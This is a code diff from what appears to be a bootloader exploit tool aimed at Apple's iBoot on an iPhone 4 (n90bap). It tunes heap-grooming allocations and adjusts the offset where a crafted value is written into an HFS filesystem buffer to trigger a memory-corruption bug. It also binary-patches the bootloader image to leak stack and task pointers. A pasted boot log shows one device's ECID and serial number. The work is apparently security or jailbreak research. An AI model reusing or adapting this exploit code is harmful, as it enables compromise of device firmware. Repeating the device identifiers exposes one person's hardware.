@@ -200,23 +200,34 @@ fuck3(void)
 void
 my_adjust_stack(void)
 {
-    /* stack is 0x5ff54894 at main task (the number at the second row) */
     /*
-     =======================================
-     ::
-     :: iBoot for n90bap, Copyright 2013, Apple Inc.
-     ::
-     ::    BUILD_TAG: 0
-     ::
-     ::    BUILD_STYLE: 0x54894
-     ::
-     ::    USB_SERIAL_NUMBER: CPID:8930 CPRV:20 CPFM:03 SCEP:02 BDID:04 ECID:00000300A89CDD6E IBFL:1B SRNM:[DX4KRY0WDP0N]
-     ::
-     =======================================
+     
+    =======================================
+    ::
+    :: iBoot for n90bap, Copyright 2013, Apple Inc.
+    ::
+    ::    BUILD_TAG: 5ff52ac0 (SP: 5ff52cc0) //current_task (task's sp)
+    ::
+    ::    BUILD_STYLE: 5ff54894 //sp arm register
+    ::
+    ::    USB_SERIAL_NUMBER: CPID:8930 CPRV:20 CPFM:03 SCEP:02 BDID:04 ECID:00000300A89CDD6E IBFL:1B SRNM:[DX4KRY0WDP0N]
+    ::
+    =======================================
+     
+    Boot Failure Count: 0    Panic Fail Count: 0
+    Delaying boot for 0 seconds. Hit enter to break into the command prompt...
+    HFSInitPartition: 0x5fff6b80
+    Entering recovery mode, starting command prompt
+     
      */
-    /* wihtout anything is 0x540D4, 64 was a lucky guess? */
 #if 1
-    CALL(malloc)(0x7C0 - 64);
+    CALL(malloc)(0x7C0 - 64); //0xA0300 -> fits HFSInitPartition
+#elif 0
+    void *ptr;
+    ptr = CALL(malloc)(2048 - 64);
+    CALL(free)(ptr);
+    CALL(malloc)(1024 - 32);
+    CALL(malloc)(1024 - 32);
 #endif
 }
 
@@ -250,9 +261,6 @@ drillDownPathTill(void *buffer, unsigned int seq, unsigned int depth, unsigned i
             break;
         }
         if (seq == 3 * (depth + 1) + 1 && i == to_chk) {
-            /* iPhone 4 rev.A (3,2) needs +4 as offset (why?) */
-            /* inside ramdiskF.dmg the offset to which we trigger the bug is completely different UwU */
-            offset += 4;
             eprintf("TRIGGERING: writed 0x%x (BE) at offset 0x%x\n", value, offset);
             PUT_DWORD_BE(buffer, offset, value);
             return 1;
@@ -299,6 +307,14 @@ my_readp(void *ih, void *buffer, long long offset, int length)
 #else
     if (1) {
 #endif
+        
+        unsigned int i;
+        for (i = 0; i < length / 4; i++) {
+            uint32_t addr = ((uint32_t *)buffer)[i];
+            if (addr >= IMAGE_START && addr <= IMAGE_END) {
+                ((void **)image)[i] = XLAT(addr);
+            }
+        }
         
     /* XXX stack recursion eats 208 bytes, watch out for 0x4D2C0 + 0x18 = 0x4D2D8 */
     /* XXX stack recursione eats ??? bytes watch out for 0x41350 + 0x18 = 0x41368 */
@@ -658,12 +674,14 @@ patch_image(unsigned char *image)
     *(uint32_t *)(image + 0xA70) = INSN2_MOV_R0_1__MOV_R0_1;
     *(uint32_t *)(image + 0x18122) = INSN2_MOV_R0_1__MOV_R0_1;
 #if DEBUG_MALLOC
+    /* show task structure */
+    /* BUILD_TAG: */
+    *(void **)(image + 0xFA4) = image + 0x52C40; //0x41330;
+    *(uint8_t *)(image + 0x32C90) = 'x';
     /* make main_task show SP */
+    /* BUILD_STYLE: */
     *(uint16_t *)(image + 0xD94) = INSNT_MOV_R_R(1, 13);
     *(uint8_t *)(image + 0x32CA4) = 'x';
-    /* show task structure */
-    *(void **)(image + 0xFA4) = image + 0x41330;
-    *(uint8_t *)(image + 0x32C90) = 'x';
 #endif
     /* nop NAND */
     *(uint32_t *)(image + 0x1D940) = INSN2_NOP__NOP;
